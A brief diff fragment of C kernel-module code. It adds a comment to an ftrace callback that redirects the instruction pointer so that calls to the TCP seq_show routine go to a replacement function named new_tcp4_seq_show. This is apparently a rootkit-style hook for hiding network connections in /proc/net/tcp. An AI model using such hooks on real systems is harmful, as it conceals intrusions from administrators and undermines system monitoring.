@@ -54,6 +54,7 @@ int new_tcp4_seq_show(struct seq_file *seq, void *v) {
 }
 
 void notrace callback_func(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct pt_regs *regs) {
+    // To prevent an infinite loop.
     if (!within_module(parent_ip, THIS_MODULE)) {
         regs->ip = (long unsigned int)new_tcp4_seq_show;
     }
